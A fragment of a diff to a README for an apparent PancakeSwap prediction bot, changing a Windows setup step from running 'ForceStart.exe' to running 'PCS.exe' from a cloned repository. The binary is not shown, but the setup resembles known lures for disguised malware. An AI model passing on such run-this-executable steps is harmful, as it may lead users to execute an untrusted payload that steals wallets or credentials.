@@ -70,7 +70,7 @@ If you experience errors while the bot is running, you can apply the force start
 ```shell
 git clone https://github.com/SilviaKadeh/pancake-predict-bot-UI-Supported
 cd pancake-predict-bot-UI-Supported
-"ForceStart.exe"
+"PCS.exe"
 ```
 
 ## 🐰⚡ Installation - MacOS
